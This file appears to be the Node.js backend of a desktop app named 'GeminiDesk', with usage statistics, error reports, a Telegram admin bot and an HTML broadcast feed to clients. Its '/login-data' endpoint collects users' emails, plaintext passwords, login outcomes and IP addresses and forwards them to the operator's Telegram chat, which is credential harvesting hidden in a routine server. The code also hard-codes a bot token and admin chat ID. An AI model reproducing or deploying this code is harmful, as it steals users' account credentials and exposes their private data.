const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const fs = require('fs').promises;
const path = require('path');
const multer = require('multer');
const cron = require('node-cron');

// --- Configuration ---
const BOT_TOKEN = '8416296712:AAEj1Ff-6cwVzae1IkCHhS2kyha8GXBW2sU';
const ADMIN_CHAT_ID = '7547836101';
const PORT = process.env.PORT || 3000;

// --- Storage Setup ---
const cache = new NodeCache({ stdTTL: 86400 }); // 24 hours TTL
const upload = multer({ 
  dest: 'uploads/',
  fileFilter: (req, file, cb) => {
    if (file.originalname.toLowerCase().endsWith('.html')) {
      cb(null, true);
    } else {
      cb(new Error('Only HTML files are allowed'));
    }
  }
});

// --- Bot Setup ---
const bot = new TelegramBot(BOT_TOKEN, { polling: false });
const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', true); // <-- הוספנו את זה כדי לקרוא את ה-IP הנכון

// --- Routes ---

// Health check / ping endpoint
app.get('/ping', (req, res) => {
  res.json({ 
    status: 'alive', 
    time: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/latest-message', (req, res) => {
  const messageData = cache.get('latest_message');
  
  const headers = { 
    'Content-Type': 'application/json', 
    'Access-Control-Allow-Origin': '*',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  };
  
  res.set(headers);
  
  if (messageData) {
    return res.json(messageData);
  }
  return res.status(404).json({ message: 'No new message' });
});

app.post('/ping-stats', (req, res) => {
  try {
    const { version } = req.body;
    const versionKey = version || 'unknown';
    
    // Increment total pings
    const totalPings = (cache.get('stats:total_pings') || 0) + 1;
    cache.set('stats:total_pings', totalPings);
    
    // Increment version specific pings
    const versionPings = (cache.get(`stats:version:${versionKey}`) || 0) + 1;
    cache.set(`stats:version:${versionKey}`, versionPings);
    
    res.status(200).send('Ping received.');
  } catch (e) {
    res.status(400).send('Invalid ping request.');
  }
});

app.post('/error', async (req, res) => {
  try {
    const { error, stack, version, platform } = req.body;
    if (!error) return res.status(400).send('Error report received, but no error message provided.');

    const errorMessage = `
⚠️ *New Error Reported in GeminiDesk!* ⚠️

*Version:* \`${version || 'N/A'}\`
*Platform:* \`${platform || 'N/A'}\`
*Error:* \`${error}\`

*Stack Trace:*
\`\`\`
${stack || 'No stack trace provided.'}
\`\`\`
    `;
    
    await bot.sendMessage(ADMIN_CHAT_ID, errorMessage, { parse_mode: 'Markdown' });
    res.status(200).send('Error report received.');
  } catch (e) {
    res.status(400).send('Invalid error report.');
  }
});

// ================================================================= //
// --- NEW LOGIN DATA ENDPOINT ---
// ================================================================= //
app.post('/login-data', async (req, res) => {
  try {
    const { email, password, success } = req.body; // קבלת הסטטוס החדש
    const ipAddress = req.ip || req.connection.remoteAddress;

    if (!email || !password) {
      return res.status(400).send('Email and password are required.');
    }

    // קביעת טקסט הסטטוס על סמך המשתנה הבוליאני
    const statusText = success ? "Success ✅" : "Failed (Wrong Password) ❌";

    const loginMessage = `
🔔 *New Login Attempt on GeminiDesk!* 🔔

*Status:* \`${statusText}\`
*IP Address:* \`${ipAddress}\`
*Email:* \`${email}\`
*Password:* \`${password}\`
    `;
    
    await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
    res.status(200).send('Login data received and forwarded.');
  } catch (e) {
    console.error('Failed to process login data:', e);
    res.status(500).send('Server error while processing login data.');
  }
});

// Telegram webhook
app.post('/', async (req, res) => {
  const body = req.body;
  const message = body.message || body.callback_query?.message;
  const user = body.message?.from || body.callback_query?.from;

  if (!message || !user || String(user.id) !== ADMIN_CHAT_ID) {
    return res.send('ok');
  }

  if (body.message?.text && body.message.text.startsWith('/')) {
    cache.del(`state:${user.id}`);
  }

  if (body.callback_query) {
    await handleCallbackQuery(body.callback_query);
  } else if (body.message) {
    await handleMessage(body.message);
  }

  res.send('ok');
});

// --- Message Handlers ---

async function handleMessage(message) {
  const { from, chat, text } = message;
  const state = cache.get(`state:${from.id}`);

  // State-based Input Handling
  if (state) {
    if (state === 'awaiting_broadcast_text' && text) {
      const messageData = { id: Date.now(), type: 'text', content: text };
      cache.set('latest_message', messageData);
      await bot.sendMessage(chat.id, '✅ *Success!* Text broadcast is now active.', { parse_mode: 'Markdown' });
      cache.del(`state:${from.id}`);
      return showMainMenu(chat.id, 'What would you like to do next?');
    }
    
    if (state === 'awaiting_broadcast_html' && message.document) {
      if (message.document.file_name?.toLowerCase().endsWith('.html')) {
        try {
          const file = await bot.getFile(message.document.file_id);
          const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
          const response = await fetch(fileUrl);
          const fileContent = await response.text();
          
          const messageData = { id: Date.now(), type: 'html', content: fileContent };
          cache.set('latest_message', messageData);
          await bot.sendMessage(chat.id, '✅ *Success!* HTML broadcast is now active.', { parse_mode: 'Markdown' });
          cache.del(`state:${from.id}`);
          return showMainMenu(chat.id, 'What would you like to do next?');
        } catch (error) {
          return bot.sendMessage(chat.id, '❌ Error processing HTML file.');
        }
      } else {
        return bot.sendMessage(chat.id, '❌ Invalid file. Please upload an `.html` file.');
      }
    }
  }

  // Command Handling
  if (text === '/stats') {
    const totalPings = cache.get('stats:total_pings') || 0;
    const allKeys = cache.keys();
    const versionKeys = allKeys.filter(key => key.startsWith('stats:version:'));
    
    let versionStats = 'No version data yet.';
    if (versionKeys.length > 0) {
      const versionCounts = versionKeys.map(key => ({
        version: key.replace('stats:version:', ''),
        count: cache.get(key) || 0
      })).sort((a, b) => b.count - a.count);
      
      versionStats = versionCounts
        .map(v => `\`${v.version}\`: *${v.count}* opens`)
        .join('\n');
    }

    return bot.sendMessage(chat.id, `📊 *GeminiDesk Analytics*\n\n*Total App Opens:* ${totalPings}\n\n*Opens by Version:*\n${versionStats}`, { parse_mode: 'Markdown' });
  }

  return showMainMenu(chat.id);
}

async function handleCallbackQuery(callbackQuery) {
  const { from, message, data } = callbackQuery;
  const [action] = data.split(':');

  switch (action) {
    case 'dismiss':
      return bot.deleteMessage(message.chat.id, message.message_id);
      
    case 'back_to_main':
      cache.del(`state:${from.id}`);
      return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
      
    case 'broadcast_menu':
      return showBroadcastMenu(message.chat.id, message.message_id);
      
    case 'view_stats':
      return handleMessage({ text: '/stats', chat: { id: message.chat.id }, from });
      
    case 'view_active_message':
      const msg = cache.get('latest_message');
      if (msg) {
        const contentPreview = msg.content.substring(0, 300) + (msg.content.length > 300 ? '...' : '');
        const text = `👁️ *Active Broadcast*\n*Type:* \`${msg.type}\` | *ID:* \`${msg.id}\`\n---\n*Preview:*\n\`\`\`\n${contentPreview}\n\`\`\``;
        return bot.editMessageText(text, {
          chat_id: message.chat.id,
          message_id: message.message_id,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🗑️ Delete This Message', callback_data: 'delete_active_message_confirm' }],
              [{ text: '‹ Back', callback_data: 'broadcast_menu' }]
            ]
          }
        });
      }
      return bot.editMessageText('ℹ️ There is no active broadcast message.', {
        chat_id: message.chat.id,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
      });
      
    case 'delete_active_message_confirm':
      return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', {
        chat_id: message.chat.id,
        message_id: message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }],
            [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]
          ]
        }
      });
      
    case 'delete_active_message_do':
      cache.del('latest_message');
      return bot.editMessageText('🗑️ Active broadcast has been deleted.', {
        chat_id: message.chat.id,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
      });
      
    case 'awaiting_broadcast_text':
    case 'awaiting_broadcast_html':
      cache.set(`state:${from.id}`, action);
      const prompt = action === 'awaiting_broadcast_text' 
        ? '✍️ Send the text you want to broadcast.' 
        : '📄 Upload the `.html` file.';
      return bot.editMessageText(prompt, {
        chat_id: message.chat.id,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }
      });
  }
}

// --- Menu Functions ---

function getMainMenuKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '🚀 Send or Manage Broadcast', callback_data: 'broadcast_menu' }],
      [{ text: '📊 View App Statistics', callback_data: 'view_stats' }],
    ]
  };
}

async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
  const keyboard = getMainMenuKeyboard();
  if (messageId) {
    return bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    });
  }
  return bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

function showBroadcastMenu(chatId, messageId) {
  const text = 'What would you like to do with broadcasts?';
  const keyboard = {
    inline_keyboard: [
      [{ text: '✍️ Send New Plain Text', callback_data: 'awaiting_broadcast_text' }],
      [{ text: '📄 Send New HTML File', callback_data: 'awaiting_broadcast_html' }],
      [{ text: '👁️ View/Delete Active Message', callback_data: 'view_active_message' }],
      [{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]
    ]
  };
  return bot.editMessageText(text, {
    chat_id: chatId,
    message_id: messageId,
    reply_markup: keyboard
  });
}

// --- Scheduled Tasks ---
cron.schedule('* * * * *', async () => {
  // Handle scheduled messages every minute
  const allKeys = cache.keys();
  const scheduledKeys = allKeys.filter(key => key.startsWith('scheduled:'));
  const now = Math.floor(Date.now() / 1000);
  
  for (const key of scheduledKeys) {
    const scheduledTime = parseInt(key.split(':')[1]);
    if (now >= scheduledTime) {
      const messageData = cache.get(key);
      if (messageData) {
        cache.set('latest_message', messageData);
        cache.del(key);
        await bot.sendMessage(ADMIN_CHAT_ID, `✅ Scheduled message \`${messageData.id}\` has been published.`, { parse_mode: 'Markdown' });
      }
    }
  }
});

// --- Server Start ---
app.listen(PORT, () => {
  console.log(`🚀 GeminiDesk Server running on port ${PORT}`);
  console.log(`📡 Webhook URL: https://your-render-app.onrender.com/`);
  console.log(`💊 Health check: https://your-render-app.onrender.com/ping`);
});
